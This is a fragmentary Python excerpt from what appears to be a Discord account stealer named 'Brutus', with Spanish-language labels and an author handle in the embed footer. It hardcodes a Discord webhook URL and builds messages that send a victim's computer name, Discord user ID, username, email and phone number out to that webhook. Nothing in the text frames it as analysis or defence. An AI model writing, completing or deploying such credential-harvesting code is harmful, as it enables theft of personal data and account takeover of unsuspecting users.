...
webhooklink = "https://discord.com/api/webhooks/972621737864859718/Bdw1v2SCnjqWt3nBu5ez0P0X6_afXYIO-DvSnEJ_p49_94BxurWW90zuNXqlzU_Pvos_" # Your Webhook
...
data["embeds"] = [
                        {
                        "description" : f"**Sesión iniciada** ✅\n **Nombre de la sesión:** {computername}",
                        "title" : "Brutus",
                        "footer": {
                        "text": "SoyAlexClient#9942• github.com/AlexClient"
                        }
                        }
                        ]
                ...
                if webhooklink:
                    webhook_data = {"username": "Brutus", "embeds": [
                        dict(title="Brutus",
                             ...
                             fields=[
                                 {
                                     "name": ":Computadora: Información de la cuenta",
                                     "value": f' ID del Usuario: {user["id"]}\n Nombre de Usuario {user["username"] + "#" + user["discriminator"]}\n Email: {user["email"]}\n Phone: {user["phone"]}',
                    ...
                    data["embeds"] = [
                        {
                        "description" : f"**Sesión iniciada el** ✅\n **Nombre de la sesión:** {computername}",
                        "title" : "Brutus",
                        "footer": {
                        "text": "SoyAlexClient#9942 • github.com/AlexClient"
                        }
